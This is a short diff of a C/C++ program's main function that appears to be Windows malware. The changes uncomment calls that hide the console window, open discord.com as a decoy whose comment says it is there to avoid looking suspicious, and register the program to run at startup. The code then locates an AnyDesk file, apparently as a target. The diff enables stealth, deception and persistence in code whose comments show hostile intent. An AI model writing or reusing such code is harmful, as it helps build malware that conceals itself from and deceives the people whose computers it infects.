@@ -180,12 +180,12 @@ int main(int argc, char const *argv[])
 {
     bool isThereError = false;
 
-    //hideConsoleWindow(); // Hides the console window
+    hideConsoleWindow(); // Hides the console window
 
-    //ShellExecute(0, 0, L"https://discord.com/", 0, 0, SW_SHOW); // Opens discord to don't looks suspicios
+    ShellExecute(0, 0, L"https://discord.com/", 0, 0, SW_SHOW); // Opens discord to don't looks suspicios
     checkIfProgramAlreadyRunning();
     
-    //RegisterProgram(); // Registers the app to the startup
+    RegisterProgram(); // Registers the app to the startup
     setAnyDeskFilePath();
     
     if (isTheAnyDeskFile(anyDeskFilePath)) {
